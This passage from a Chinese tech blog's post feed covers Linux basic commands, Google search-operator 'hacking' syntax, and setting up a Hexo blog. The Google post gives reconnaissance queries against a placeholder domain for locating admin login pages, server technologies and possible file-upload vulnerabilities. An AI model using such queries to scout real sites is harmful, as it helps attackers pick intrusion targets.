存放系统安装软件的目录<br>这是另⼀个给主机额外安装软件所安装的⽬录。⼀般是通过编译源代码的⽅式安装程序。</p><p>&#x2F;var : 存放系统日志<br>这个⽬录中存放着不断扩充的东⻄，习惯将经常被修改的⽬录放在这个⽬录下。</p><p>&#x2F;etc : 系统配置目录</p><p>&#x2F;run : 存放系统运行临时数据目录</p><h1 id="Linux系统常用命令"><a href="#Linux系统常用命令" class="headerlink" title="Linux系统常用命令"></a>Linux系统常用命令</h1><h3 id="Linux命令的分类"><a href="#Linux命令的分类" class="headerlink" title="Linux命令的分类"></a>Linux命令的分类</h3><p>Linux命令</p><ul><li><p>用于实现某一类功能的指令或程序 </p></li><li><p>命令的执行依赖于解释器程序（例如：&#x2F;bin&#x2F;bash）<br>Linux命令的分类</p></li><li><p>内部命令：属于Shell解释器的一部分</p></li><li><p>外部命令：独立于Shell解释器之外的程序文件</p><h3 id="Linux命令行格式"><a href="#Linux命令行格式" class="headerlink" title="Linux命令行格式"></a>Linux命令行格式</h3></li><li><p>命令字  [选项]  [参数]</p></li><li><p>选项及参数含义</p></li><li><p>选项：用于调节命令的具体功能</p></li><li><p>以 “-”引导短格式选项（单个字符），例如“-l”</p></li><li><p>以“–”引导长格式选项（多个字符），例如“–color”</p></li><li><p>多个短格式选项可以写在一起，只用一个“-”引导，例如“-al”</p></li><li><p>参数：命令操作的对象，如文件、目录名等</p><h1 id="Linux系统命令"><a href="#Linux系统命令" class="headerlink" title="Linux系统命令"></a>Linux系统命令</h1><h3 id="获得命令帮助"><a href="#获得命令帮助" class="headerlink" title="获得命令帮助"></a>获得命令帮助</h3></li><li><p>内部命令help</p></li><li><p>查看Bash内部命令的帮助信息</p></li><li><p>命令的“–help”选项</p></li><li><p>适用于大多数外部命令 </p></li><li><p>使用man命令阅读手册页</p></li><li><p>使用方向键滚动文本</p></li><li><p>使用Page Up和Page Down键翻页 </p></li><li><p>按Q或q键退出阅读环境、按“&#x2F;”键后查找内容</p><h3 id="Linux系统命令-1"><a href="#Linux系统命令-1" class="headerlink" title="Linux系统命令"></a>Linux系统命令</h3></li><li><p>uname       查看系统内核信息 -r查看内核版本号 -a  显示详细信息</p></li><li><p>hostname    查看或临时修改主机名称</p></li><li><p>ifconfig    查看系统ip信息</p></li><li><p>cat &#x2F;proc&#x2F;cpuinfo    查看系统cpu信息</p></li><li><p>cat &#x2F;proc&#x2F;meminfo    查看系统内存信息</p></li><li><p>halt        关机</p></li><li><p>reboot      重启</p></li><li><p>pwd    查看工作目录</p></li><li><p>cd    切换目录</p></li><li><p>du    统计目录及文件空间占用情况 -sh统计目录大小</p><h3 id="目录操作命令-ls"><a href="#目录操作命令-ls" class="headerlink" title="目录操作命令 - ls"></a>目录操作命令 - ls</h3></li><li><p>ls命令</p></li><li><p>用途：列表（List）显示目录内容 </p></li><li><p>格式：ls  [选项]…  [目录或文件名]</p></li><li><p>常用命令选项</p></li><li><p>-l ：以长格式显示</p></li><li><p>-a：显示所有子目录和文件的信息，包括隐藏文件</p></li><li><p>-A：类似于“-a”，但不显示“.”和“..”目录的信息</p></li><li><p>-d：显示目录本身的属性</p></li><li><p>-h：以更易读的字节单位（K、M等）显示信息</p></li><li><p>-R：递归显示内容</p></li><li><p>–color：以颜色区分不同类型文件</p><h3 id="权限设置命令"><a href="#权限设置命令" class="headerlink" title="权限设置命令"></a>权限设置命令</h3></li><li><p>Chmod </p></li><li><p>U 是所有者用户  g 是组 o其他人 a所有人</p></li><li><p>R读  w写 x可执行</p></li><li><p>用法</p></li><li><p>Chmod u+w  给所有者用户添加写入权限</p></li><li><p>Chmod g-r     给所在分组去掉读取权限</p></li><li><p>权限用数字代替</p></li><li><p>R&#x3D;4    w&#x3D;2  x&#x3D;1     权限值等于每个权限数字相加</p></li><li><p>Chmod 777     给所有权限设置为可读可写可执行</p></li><li><p>Chown  设置所有者和所在分组用户</p></li><li><p>Chown  Apache:Apache    test   登录吧test目录所有者和所组设置为Apache用户</p><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3></li><li><p>touch       创建文件或跟新文件时间标记</p></li><li><p>mkdir       创建目录命令   -p递归创建目录</p></li><li><p>cp    复制文件或目录  -r递归复制  -f强制覆盖 -p保持源文件属性不变</p></li><li><p>-i覆盖文件目录提醒</p></li><li><p>rm     删除文件或目录  -r递归删除  -f 强制删除不提醒  -i 删除时用户提醒</p></li><li><p>mv          移动文件或目录</p></li><li><p>wc    统计文件中出现的单词数量字节数量和行数</p></li><li><p>Cat       查看文件内容命令</p><h3 id="文件或目录查找命令"><a href="#文件或目录查找命令" class="headerlink" title="文件或目录查找命令"></a>文件或目录查找命令</h3></li><li><p>find命令<br>  用途：用于查找文件或目录<br>  格式：find  [查找范围]  [查找条件]</p></li><li><p>常用查找条件<br>-name：按文件名称查找<br>-size：按文件大小查找<br>-user：按文件属主查找<br>-type：按文件类型查找</p><h3 id="压缩命令-gzip-bzip2"><a href="#压缩命令-gzip-bzip2" class="headerlink" title="压缩命令  gzip  bzip2"></a>压缩命令  gzip  bzip2</h3><p>gzip命令不仅能压缩文件也能实现文件的解压操作，利用gzip命令可以将普通文件压缩成.gz为后缀 的压缩文件，压缩成功后原始文件消失。且可指定压缩机别，该命令的压缩级别范围是1~9级，默认为6，1的压缩比最差，速度最快；9的压缩比最好，速度较慢。  </p></li><li><p>加压：gzip -q [文件名] (或gzip [文件名])</p></li><li><p>解压：gzip -d [文件名]</p></li></ul><p>利用bzip2命令可以将普通文件压缩成.bz2为后缀 的压缩文件，压缩成功后原始文件消失。</p><ul><li><p>加压：bzip2 -q[文件名]</p></li><li><p>解压：bzip2 -d [文件名]</p></li><li><p>bzip2需要下载才能使用</p><h3 id="归档命令-tar"><a href="#归档命令-tar" class="headerlink" title="归档命令  tar"></a>归档命令  tar</h3></li><li><p>tar  归档命令  释放归档文件  没有压缩功能<br>格式 tar  选项  归档文件名   源文件或目录  </p></li><li><p>-c  创建归档文件           扩展名为.tar</p></li><li><p>-v 输出详细信息       -f   表示使用归档文件   如 -cvf  创建归档文件</p></li><li><p>tar  -cvf  4.tar 1 2 3   将文件1 2 3 打包归档为4.tar</p></li><li><p>tar  -xvf  4.tar         解包归档文件4.tar            -xvf  解包归档文件</p></li><li><p>-x  解开归档文件    -t  列表查看包内的文件（不释放解包）</p></li><li><p>tar -tvf 4.tar   -r   追加TAR文件至归档结尾</p></li><li><p>tar -rvf 4.tar 5 把5加入4.tar</p></li><li><p>-p   解包时保留原始文件及目录的权限</p></li><li><p>-C （大）   解包时指定释放的目标文件夹</p></li><li><p>-z  调用gzip 程序   进行解压或压缩  -j  调用bzip2  程序进行压缩或解压</p></li><li><p>tar -cvzf  test.tar.gz   被压缩的文件1  被压缩的文件2   创建归档压缩文件 后缀为gz</p></li><li><p>tar -cvjf  test.tar.bz2  被压缩的文件1  被压缩的文件2   创建归档压缩文件 后缀为bz2</p></li><li><p>tar -xvzf  test.tar.gz  -C  &#x2F;usr&#x2F;src  解压释放归档到 &#x2F;usr&#x2F;src 里面</p></li><li><p>tar -xvjf  test.tar.bz2 -C  &#x2F;usr&#x2F;src  解压释放归档到 &#x2F;usr&#x2F;src 里面</p><h3 id="添加用户账号"><a href="#添加用户账号" class="headerlink" title="添加用户账号"></a>添加用户账号</h3></li><li><p>useradd命令</p></li><li><p>格式：useradd  [选项]…  用户名</p></li><li><p>常用命令选项</p></li><li><p>-u：指定 UID 标记号</p></li><li><p>-d：指定宿主目录，缺省为 &#x2F;home&#x2F;用户名</p></li><li><p>-e：指定帐号失效时间</p></li><li><p>-g：指定用户的基本组名（或UID号）</p></li><li><p>-G：指定用户的附加组名（或GID号）</p></li><li><p>-M：不为用户建立并初始化宿主目录</p></li><li><p>-s：指定用户的登录Shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# useradd -d /ftphome/mike -g mike -G ftpuser -s /sbin/nologin mike </span><br></pre></td></tr></table></figure><h3 id="删除用户账号——userdel"><a href="#删除用户账号——userdel" class="headerlink" title="删除用户账号——userdel"></a>删除用户账号——userdel</h3></li><li><p>userdel命令</p></li><li><p>格式：userdel  [-r]  用户名</p></li><li><p>添加 -r 选项时，表示连用户的宿主目录一并删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# userdel -r stu01</span><br><span class="line">[root@localhost ~]# ls -ld /home/stu01/</span><br></pre></td></tr></table></figure><h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3></li><li><p>Ps  -aux  查看系统进程</p></li><li><p>Top          动态查看系统进程</p></li><li><p>Kill   1234   杀死进程1234</p><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3></li><li><p>Ifconfig  eth0  192.168.1.20&#x2F;24   临时修改eth0 网卡ip</p></li><li><p>Route –n  查看系统路由信息</p></li><li><p>Netstat    查看网络连接情况</p></li><li><p>netstat命令</p></li><li><p>查看系统的网络连接状态、路由表、接口统计等信息</p></li><li><p>格式：netstat [选项]</p></li><li><p>常用选项：</p></li><li><p>-a：显示所有活动连接</p></li><li><p>-n：以数字形式显示</p></li><li><p>-p：显示进程信息</p></li><li><p>-t：查看TCP协议相关信息</p></li><li><p>-u：查看UDP协议相关信息</p></li><li><p>-r：显示路由表信息</p></li><li><h3 id="网络接口配置文件"><a href="#网络接口配置文件" class="headerlink" title="网络接口配置文件"></a>网络接口配置文件</h3></li><li><p>&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;目录下的</p></li><li><p>ifcfg-eth0：第1块以太网卡的配置文件</p></li><li><p>ifcfg-eth1：第2块以太网卡的配置文件</p></li></ul><p>修改了配置文件要重启网络服务: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Service  network restart</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ls /etc/sysconfig/network-scripts/ifcfg-*</span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">/etc/sysconfig/network-scripts/ifcfg-lo  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#vim /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">DEVICE=eth0</span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.4.1</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.4.2</span><br></pre></td></tr></table></figure><h3 id="域名解析配置文件"><a href="#域名解析配置文件" class="headerlink" title="域名解析配置文件"></a>域名解析配置文件</h3><p>&#x2F;etc&#x2F;resolv.conf<br>用途：保存本机需要使用的DNS服务器的IP地址  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# vi /etc/resolv.conf</span><br><span class="line">search localdomain</span><br><span class="line">nameserver 1.1.1.1</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure><h1 id="Linux-vi-x2F-vim"><a href="#Linux-vi-x2F-vim" class="headerlink" title="Linux vi&#x2F;vim"></a>Linux vi&#x2F;vim</h1><p>Vim 是从 vi 发展出来的一个文本编辑器。代码补全、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。<br>简单的来说， vi 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。 vim 则可以说是程序开发者的一项很好用的工具。<br><img src="/img/vi-vim-cheat-sheet-sch.gif"></p><p>vi&#x2F;vim 的使用<br>基本上 vi&#x2F;vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。 这三种模式的作用分别是：  </p><p>命令模式：<br>用户刚刚启动 vi&#x2F;vim，便进入了命令模式。<br>此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。<br>以下是常用的几个命令：</p><ul><li>i 切换到输入模式，以输入字符。</li><li>x 删除当前光标所在处的字符。</li><li>: 切换到底线命令模式，以在最底一行输入命令。</li><li>若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。</li><li>命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。</li></ul><p>输入模式<br>在命令模式下按下i就进入了输入模式。<br>在输入模式中，可以使用以下按键：</p><ul><li>字符按键以及Shift组合，输入字符</li><li>ENTER，回车键，换行</li><li>BACK SPACE，退格键，删除光标前一个字符</li><li>DEL，删除键，删除光标后一个字符</li><li>方向键，在文本中移动光标</li><li>HOME&#x2F;END，移动光标到行首&#x2F;行尾</li><li>Page Up&#x2F;Page Down，上&#x2F;下翻页</li><li>Insert，切换光标为输入&#x2F;替换模式，光标将变成竖线&#x2F;下划线</li><li>ESC，退出输入模式，切换到命令模式</li></ul><p>底线命令模式<br>在命令模式下按下:（英文冒号）就进入了底线命令模式。<br>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</p><ul><li>q 退出程序</li><li>w 保存文件</li><li>wq 保存并退出</li><li>按ESC键可随时退出底线命令模式。<h1 id="Linux-yum-命令"><a href="#Linux-yum-命令" class="headerlink" title="Linux yum 命令"></a>Linux yum 命令</h1>yum（ Yellow dog Updater, Modified）是一个在 Fedora 和 RedHat 以及 SUSE 中的 Shell 前端软件包管理器。<br>基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。<br>yum 提供了查找、安装、删除某一个、一组甚至全部软件包的命令。  <h2 id="yum常用命令"><a href="#yum常用命令" class="headerlink" title="yum常用命令"></a>yum常用命令</h2></li><li>列出所有可更新的软件清单命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum check-update</span><br></pre></td></tr></table></figure></li><li>更新所有软件命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure></li><li>仅安装指定的软件命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install &lt;package_name&gt;</span><br></pre></td></tr></table></figure></li><li>仅更新指定的软件命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update &lt;package_name&gt;</span><br></pre></td></tr></table></figure></li><li>列出所有可安裝的软件清单命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list</span><br></pre></td></tr></table></figure></li><li>删除软件包命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove &lt;package_name&gt;</span><br></pre></td></tr></table></figure></li><li>查找软件包命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum search &lt;keyword&gt;</span><br></pre></td></tr></table></figure></li><li>清除缓存命令:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum clean packages: 清除缓存目录下的软件包             </span><br><span class="line">yum clean headers: 清除缓存目录下的 headers            </span><br><span class="line">yum clean oldheaders: 清除缓存目录下旧的 headers </span><br><span class="line">yum clean, yum clean all (= yum clean packages; yum clean oldheaders) :清除缓存目录下的软件包及旧的 headers</span><br></pre></td></tr></table></figure></li></ul><h2 id="Linux-apt-命令"><a href="#Linux-apt-命令" class="headerlink" title="Linux apt 命令"></a>Linux apt 命令</h2><ul><li>apt（Advanced Packaging Tool）是一个在 Debian 和 Ubuntu 中的 Shell 前端软件包管理器。</li><li>apt 命令提供了查找、安装、升级、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。</li><li>apt 命令执行需要超级管理员权限(root)。<h2 id="apt-常用命令"><a href="#apt-常用命令" class="headerlink" title="apt 常用命令"></a>apt 常用命令</h2></li><li>列出所有可更新的软件清单命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li><li>升级软件包：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure></li><li>列出可更新的软件包及版本信息：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --upgradeable</span><br></pre></td></tr></table></figure></li><li>升级软件包，升级前先删除需要更新软件包：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt full-upgrade</span><br></pre></td></tr></table></figure></li><li>安装指定的软件命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install &lt;package_name&gt;</span><br></pre></td></tr></table></figure></li><li>安装多个软件包：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install &lt;package_1&gt; &lt;package_2&gt; &lt;package_3&gt;</span><br></pre></td></tr></table></figure></li><li>更新指定的软件命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &lt;package_name&gt;</span><br></pre></td></tr></table></figure></li><li>显示软件包具体信息,例如：版本号，安装大小，依赖关系等等：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt show &lt;package_name&gt;</span><br></pre></td></tr></table></figure></li><li>删除软件包命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove &lt;package_name&gt;</span><br></pre></td></tr></table></figure></li><li>清理不再使用的依赖和库文件: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure></li><li>移除软件包及配置文件: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt purge &lt;package_name&gt;</span><br></pre></td></tr></table></figure></li><li>查找软件包命令： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search &lt;keyword&gt;</span><br></pre></td></tr></table></figure></li><li>列出所有已安装的包：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure></li><li>列出所有已安装的包的版本信息：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --all-versions</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谷歌Hacker语法</title>
      <link href="/archives/f25a4449.html"/>
      <url>/archives/f25a4449.html</url>
      
        <content type="html"><![CDATA[<h1 id="在信息收集中常用谷歌Hacker语法"><a href="#在信息收集中常用谷歌Hacker语法" class="headerlink" title="在信息收集中常用谷歌Hacker语法"></a>在信息收集中常用谷歌Hacker语法</h1><h2 id="Intext"><a href="#Intext" class="headerlink" title="Intext:"></a>Intext:</h2><p>查找网页中含有xx关键字的网站                         </p><h2 id="Intitle："><a href="#Intitle：" class="headerlink" title="Intitle："></a>Intitle：</h2><p>查找某个标题                                    </p><h2 id="allintitle"><a href="#allintitle" class="headerlink" title="allintitle:"></a>allintitle:</h2><p>用法和intitle类似，只不过可以指定多个词               </p><h2 id="Filetype："><a href="#Filetype：" class="headerlink" title="Filetype："></a>Filetype：</h2><p>查找某个文件类型的文件                          </p><h2 id="Inurl"><a href="#Inurl" class="headerlink" title="Inurl:"></a>Inurl:</h2><p>查找url中带有某字段的网站  inurl:?id&#x3D;1                           </p><h2 id="allinurl"><a href="#allinurl" class="headerlink" title="allinurl:"></a>allinurl:</h2><p>用法和inurl类似，只不过可以指定多个词                </p><h2 id="Site："><a href="#Site：" class="headerlink" title="Site："></a>Site：</h2><p>在某域名中查找信息                                 </p><h2 id="filetype"><a href="#filetype" class="headerlink" title="filetype:"></a>filetype:</h2><p>指定访问的文件类型                                   </p><h2 id="link"><a href="#link" class="headerlink" title="link:"></a>link:</h2><p>指定链接的网页                                    </p><h2 id="related"><a href="#related" class="headerlink" title="related:"></a>related:</h2><p>相似类型的网页,相似指的是网页的布局相似                    </p><h2 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h2><p>网页快照，谷歌将返回给你他存储下来的历史页面</p><h2 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h2><p>返回站点的指定信息</p><h2 id="define"><a href="#define" class="headerlink" title="define:"></a>define:</h2><p>返回某个词语的定义</p><h2 id="phonebook"><a href="#phonebook" class="headerlink" title="phonebook:"></a>phonebook:</h2><p>电话簿查询美国街道地址和电话号码信息</p><h1 id="一些组合命令"><a href="#一些组合命令" class="headerlink" title="一些组合命令"></a>一些组合命令</h1><h2 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:http://xx.com intext:管理</span><br><span class="line">site:http://xx.com inurl:login</span><br><span class="line">site:http://xx.com intitle:后台</span><br></pre></td></tr></table></figure><h2 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:http://xx.com filetype:asp</span><br><span class="line">site:http://xx.com filetype:php</span><br><span class="line">site:http://xx.com filetype:jsp</span><br><span class="line">site:http://xx.com filetype:aspx</span><br></pre></td></tr></table></figure><h2 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:http://xx.com inurl:file</span><br><span class="line">site:http://xx.com inurl:load</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 谷歌hacker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEXO+butterfly主题博客搭建</title>
      <link href="/archives/2aba2bd0.html"/>
      <url>/archives/2aba2bd0.html</url>
      
        <content type="html"><![CDATA[<p>个人在Windows10系统下搭建hexo博客框架+butterfly主题的一些过程和遇到的一些问题</p><h2 id="安装软件环境"><a href="#安装软件环境" class="headerlink" title="安装软件环境"></a>安装软件环境</h2><h3 id="安装Nodejs-官网下载地址如下"><a href="#安装Nodejs-官网下载地址如下" class="headerlink" title="安装Nodejs 官网下载地址如下"></a>安装Nodejs 官网下载地址如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nodejs.org/en/download/</span><br></pre></td></tr></table></figure><h4 id="查看node版本"><a href="#查看node版本" class="headerlink" title="查看node版本"></a>查看node版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><h4 id="查看npm版本"><a href="#查看npm版本" class="headerlink" title="查看npm版本"></a>查看npm版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure><h3 id="安装Git-官网下载地址如下"><a href="#安装Git-官网下载地址如下" class="headerlink" title="安装Git 官网下载地址如下"></a>安装Git 官网下载地址如下</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://git-scm.com/</span><br></pre></td></tr></table></figure><p><b><font size=5>以下命令行内容都可以用Git Bash运行</font></b></p><h2 id="安装淘宝的cnpm-管理器"><a href="#安装淘宝的cnpm-管理器" class="headerlink" title="安装淘宝的cnpm 管理器"></a>安装淘宝的cnpm 管理器</h2><p>由于npmjs.org的服务器在国外，很多“包”的下载速度极慢，在这种环境下阿里巴巴推出了淘宝镜像(即cnpm)，它把npm官方的“包”全部搬到国内，供广大开发者使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=http://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h4 id="查看cnpm版本"><a href="#查看cnpm版本" class="headerlink" title="查看cnpm版本"></a>查看cnpm版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm -v</span><br></pre></td></tr></table></figure><h2 id="安装hexo框架"><a href="#安装hexo框架" class="headerlink" title="安装hexo框架"></a>安装hexo框架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><h4 id="查看hexo版本"><a href="#查看hexo版本" class="headerlink" title="查看hexo版本"></a>查看hexo版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><h2 id="创建blog目录"><a href="#创建blog目录" class="headerlink" title="创建blog目录"></a>创建blog目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir C:\blog   #在c盘目录下创建名为blog文件夹（根据自己的实际情况创建），在winsows也可以直接右键新建文件夹</span><br></pre></td></tr></table></figure><h4 id="进入blog目录"><a href="#进入blog目录" class="headerlink" title="进入blog目录"></a>进入blog目录</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd blog </span><br></pre></td></tr></table></figure><h4 id="生成博客"><a href="#生成博客" class="headerlink" title="生成博客"></a>生成博客</h4><p>在blog文件夹下生成hexo博客框架，删除hexo框架直接删除blog文件夹即可，备份迁移同理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><h4 id="启动本地博客服务"><a href="#启动本地博客服务" class="headerlink" title="启动本地博客服务"></a>启动本地博客服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><h4 id="本地访问地址"><a href="#本地访问地址" class="headerlink" title="本地访问地址"></a>本地访问地址</h4><p>在浏览器地址框输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:4000/</span><br></pre></td></tr></table></figure><h4 id="创建新的文章"><a href="#创建新的文章" class="headerlink" title="创建新的文章"></a>创建新的文章</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;我的第一篇文章&quot;</span><br></pre></td></tr></table></figure><p>创建的新文章在C:\blog\source_posts目录下.md的文件格式。</p><h4 id="返回blog目录"><a href="#返回blog目录" class="headerlink" title="返回blog目录"></a>返回blog目录</h4><h5 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><h5 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><h2 id="Github创建一个新的仓库-YourGithubName-github-io"><a href="#Github创建一个新的仓库-YourGithubName-github-io" class="headerlink" title="Github创建一个新的仓库 YourGithubName.github.io"></a>Github创建一个新的仓库 YourGithubName.github.io</h2><p>‘YourGithubName’是你自己注册的github的名字，名字一定要正确不能有空格。</p><h4 id="适用于Hexo的Git部署程序插件"><a href="#适用于Hexo的Git部署程序插件" class="headerlink" title="适用于Hexo的Git部署程序插件"></a>适用于Hexo的Git部署程序插件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 